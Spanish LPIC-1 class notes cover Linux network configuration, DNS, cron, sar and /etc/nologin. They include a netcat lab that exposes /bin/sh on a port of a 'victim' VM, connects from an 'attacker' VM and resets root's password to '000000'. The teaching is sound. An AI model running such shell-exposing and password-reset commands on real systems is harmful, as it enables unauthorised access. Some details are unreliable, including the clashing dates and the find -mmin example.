# Clase 9 Lunes 06 10 2025

Apuntes de clase sobre Clase 9 Lunes 06 10 2025, reorganizados para facilitar la consulta rápida y el repaso.

**Lunes 09/09/2026

## Referencias

- https://www.lpi.org/es/our-certifications/lpic-1-overview

## Materiales publicos de LPIC:

- https://learning.lpi.org/es/learning-materials/learning-materials/

## Guias IBM:

- https://developer.ibm.com/tutorials/l-lpic1-map

Profesor/a Titular: Alberto Garcia

## Conectarme a traves del cliente ssh de Windows abrimos un cmd:

## Maquina rockylinux:

```bash
ssh root@192.168.33.10
```

## Maquina debian12:

```bash
ssh vagrant@192.168.33.11
```

## Para trabajar como root en la mv de debian:

### sudo -i

> Clonar repositorio formador para realizar los laboratorio del Shell Bash de Linux Comandos Manejo de Texto.pdf :

```bash
dnf install git unzip -y
apt install git unzip -y
```

```bash
cd /
git clone https://github.com/agarciafer/lpic1.git
cd /lpic1
unzip access_log.zip
```

---

## En esta clase veremos:

Tema 109: Fundamentos de redes Material Alumnos LPIC-1-2025\LPIC-1-exam-102\9-Topic 109-Configuracion de red Configurar la red en RedHat.txt Configuración Red Debian.txt

## Tema 110: Seguridad

Material Alumnos LPIC-1-2025\LPIC-1-exam-102\10-Topic 110-Seguridad

---

## Laboratorio configurar la red en Redhat, utilizando el comando nmcli:

En el VirtualBox, para poder realizar el laboratorio de forma practica, parar la mv y en Red, activar el Adaptador 3 con la misma configuracion que tiene el Adaptador 2:

servidor1.curso.local 192.168.33.50 255.255.255.0 GW-->192.168.33.1 Dns1 8.8.8.8 DNS2 8.8.4.4 eth2

## En redhat comenzamos el laboratorio:

```bash
ifconfig -a
ip a show
ip a show eth2
```

## Sin dns:

```bash
nmcli connection add con-name eth2 type ethernet ifname eth2 ipv4.addresses 192.168.33.50/24 ipv4.gateway 192.168.33.1 ipv4.method manual
```

## Con dns:

```bash
nmcli connection add con-name eth2 type ethernet ifname eth2 ipv4.addresses 192.168.33.50/24 ipv4.gateway 192.168.33.1 ipv4.dns "8.8.8.8,8.8.4.4" ipv4.method manual
```

## Explicación de cada parámetro:

> con-name eth2 → nombre de la conexión. type ethernet → tipo de conexión. ifname eth2 → interfaz física. ipv4.addresses 192.168.33.50/24 → dirección IP y máscara. ipv4.gateway 192.168.33.1 → puerta de enlace. ipv4.dns "8.8.8.8,8.8.4.4" → lista de servidores DNS. ipv4.method manual → configuración estática (sin DHCP).

## El comando anterior creara la configuacion /etc/sysconfig/network-scripts/ifcfg-eth2

```bash
cat  /etc/sysconfig/network-scripts/ifcfg-eth2
TYPE=Ethernet
BOOTPROTO=none
DEFROUTE=yes
NAME=eth2
ONBOOT=yes
IPADDR=192.168.33.50
NETMASK=255.255.255.0
GATEWAY=192.168.33.1
```

## Podemos reainiar la red

```bash
systemctl restart NetworkManager
```

```bash
ip a
ip a show eth2
```

Ahora podria conectarme a la ip 192.168.33.50

## Configurar el nombre del servidor:

```bash
hostnamectl set-hostname servidor1.curso.local
systemctl restart systemd-hostnamed
```

## El comando anterior crear el archivo:

```bash
/etc/hostname
```

servidor1.curso.local

## Configurar el cliente de DNS:

```
vi  /etc/resolv.conf
```

nameserver 8.8.8.8 nameserver 8.8.4.4 domain curso.local search localdomain curso.local

## Resolver a traves del dns configurado:

nslookup cntg.xunta.gal

## En nuestro laboratorio practivo NO REALIZAR EL CAMBIO:

```
 vi /etc/hosts
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
192.168.33.50     servidor1.curso.local servidor1
```

---

## Debian lo configuramos con la ip 192.168.33.55:

```bash
vi /etc/network/interfaces
```

La línea auto eth2 en Debian indica que la interfaz de red eth2 debe activarse automáticamente al iniciar el sistema. auto eth2 iface eth2 inet static address 192.168.33.55 netmask 255.255.255.0 #gateway 192.168.33.1 dns-nameservers 8.8.8.8 8.8.4.4 dns-search curso.local

```bash
sudo systemctl restart networking
ip a show eth2
ip route
cat /etc/resolv.conf
```

## Configurar el nombre del servidor:

```bash
hostnamectl set-hostname servidor1.curso.local
systemctl restart systemd-hostnamed
```

## El comando anterior crear el archivo:

```bash
/etc/hostname
```

servidor1.curso.local

## Configurar el cliente de DNS:

```
vi  /etc/resolv.conf
```

nameserver 8.8.8.8 nameserver 8.8.4.4 domain curso.local search localdomain curso.local

## Resolver a traves del dns configurado:

nslookup cntg.xunta.gal

## En nuestro laboratorio practivo NO REALIZAR EL CAMBIO:

```
 vi /etc/hosts
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
192.168.33.50     servidor1.curso.local servidor1
```

---

El usuario lunes6 tiene una tarea en el cron: Buscar en el /tmp archivos modificados hace menos de 5 minustos, la tarea es en dias laborables y se lanza a las 11:30 horas y tiene que enviarme por correo la salida de la tarea.

### adduser lunes6

```bash
passwd lunes6
```

```bash
crontab -l
crontab -e
30 11 * * 1-5 /usr/bin/find /tmp -mmin 5 -print 2>&1 |mail -s "Ficheros modificados hace menos de 5 minutos"  usuario@correo.es
```

### Horario (30 11 * * 1-5)

30 → minuto 30 11 → hora 11 (es decir, 11:30)

## * → cualquier día del mes y cualquier mes

1-5 → días de la semana de lunes (1) a viernes (5) Conclusión: se ejecuta a las 11:30 AM de lunes a viernes.

---

```bash
 dnf install sysstat -y
```

- DEV para obtener estadísticas sobre un dispositivo específico.
- EDEV para obtener estadísticas sobre los fallos de un dispositivo específico.
- ALL para generar un informe completo de las estadísticas de red.

### sar -n DEV 1 5

sar -n DEV 2

## sar -n EDEV 2

Valor Descripción IFACE Nombre de la interfaz. rxerr/s Número total de paquetes erróneos recibidos por segundo. txerr/s Número total de errores en la transmisión de paquetes por segundo. coll/s Número de colisiones durante la transmisión de paquetes por segundo. rxdrop/s Número de paquetes perdidos por segundo. txdrop/s Número de paquetes transmitidos perdidos por segundo. txcarr/s Número de errores de la portadora producidos por segundo. rxfram/s Número de errores de alineación de trama que se producen por segundo en los paquetes recibidos. rxfifo/s Número de errores FIFO que se producen por segundo en los paquetes recibidos.

---

## Laboratorio Reverse Shell-Netcat:

Una reverse shell con Netcat (ncat) es una técnica comúnmente usada para que un sistema remoto se conecte a tu máquina y te dé acceso a su terminal.

## En la máquina de la víctima debian-12 192.168.33.11:

$ sudo apt-get update -y $ sudo apt-get install netcat -y

### nc -lvp 1234 -e /bin/sh &

```conf
-l = escuchar
-v = modo detallado (verbose)
-p = puerto
```

### Desde la maquina atacante que es la Rocky Linux  192.168.33.10

```bash
yum install nmap-ncat -y
```

### nc 192.168.33.11 1234

```bash
pwd
cat /etc/hostname
```

### adduser sabado04

```bash
echo "000000" | passwd  --stdin sabado04
echo "000000" | passwd  --stdin root
```

```bash
echo "sabado04:000000" | sudo chpasswd
```

## Explicación para debian no tiene --stdin:

chpasswd lee líneas en formato usuario:contraseña. Aplica directamente los cambios en /etc/shadow. Es la forma correcta y no interactiva en Debian.

```bash
echo "000000" | passwd  --stdin vagrant
echo "vagrant" | passwd  --stdin vagrant
```

---

El archivo /etc/nologin en sistemas Linux y Unix es utilizado para bloquear el acceso de usuarios regulares al sistema, especialmente durante tareas de mantenimiento o actualización. Cuando este archivo está presente, el sistema impide el inicio de sesión de los usuarios no privilegiados y muestra un mensaje que especifica que el acceso está restringido.

## Para bloquear el acceso a usuarios regulares y personalizar el mensaje:

```bash
echo "El sistema está en mantenimiento. Inténtelo más tarde." | sudo tee /etc/nologin
```

## Una vez completado el mantenimiento, elimina el archivo para permitir el acceso de nuevo:

```bash
sudo rm /etc/nologin
```

/etc/nologin es una forma sencilla y efectiva de gestionar el acceso al sistema durante tiempos de inactividad.

En la mv de Rocky con el usuario root y el usuario vagrant tendriamos que poder conectarnos En la mv de debian12 solo con el usuario vagrant

Los usuario nominales no se pueden conectar mistras exista el archivo /etc/nologin

## Una vez completado el mantenimiento, elimina el archivo para permitir el acceso de nuevo:

```bash
sudo rm /etc/nologin
```
